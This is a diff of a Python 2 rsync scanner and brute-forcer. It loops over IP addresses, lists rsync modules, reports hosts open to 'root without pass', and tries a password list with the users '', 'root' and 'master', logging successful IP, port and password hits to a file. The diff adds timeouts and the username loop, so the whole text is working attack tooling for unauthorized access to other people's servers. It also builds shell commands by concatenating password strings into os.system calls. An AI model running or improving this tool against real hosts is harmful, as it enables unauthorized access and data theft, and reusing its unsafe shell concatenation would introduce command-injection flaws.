@@ -7,7 +7,7 @@ def scan(ips,port,userpass):
 	for ip in ips:
 		print ip
 		isok = 0
-		cmd = 'rsync %s:: --port=%s --contimeout=2' % (ip,port)
+		cmd = 'rsync %s:: --port=%s --timeout=5 --contimeout=2' % (ip,port)
 		dirs = []
 		for line in os.popen(cmd):
 			line = line.strip().split(' ')[-1]
@@ -19,13 +19,18 @@ def scan(ips,port,userpass):
 			print ip+'||'+port+'||root without pass'
 		if len(dirs) > 0:
 			for pwd in userpass:
-				os.system('echo '+pwd+' > pwd.txt')
-				os.system('chmod 777 pwd.txt')
+				readok = 0
+				os.system('echo '+pwd+' > /root/Desktop/pwd.txt')
+				os.system('chmod 600 /root/Desktop/pwd.txt')
 				the_dir = dirs[1]
-				cmd = 'rsync %s@%s::%s --port=%s --password-file="pwd.txt" --contimeout=2' %(user,ip,the_dir,port)
-				if os.popen(cmd).read():
-					f.write(ip+'||'+port+'||'+pwd+'\n')
-					print ip+'||'+port+'||'+pwd
+				for user in ['','root','master']:
+					cmd = 'rsync %s@%s::%s --port=%s --password-file="/root/Desktop/pwd.txt" --timeout=5 --contimeout=2' %(user,ip,the_dir,port)
+					if os.popen(cmd).read():
+						f.write(ip+'||'+port+'||'+pwd+'\n')
+						print ip+'||'+port+'||'+pwd
+						readok = 1
+						break
+				if readok:
 					break
 	f.close()
 
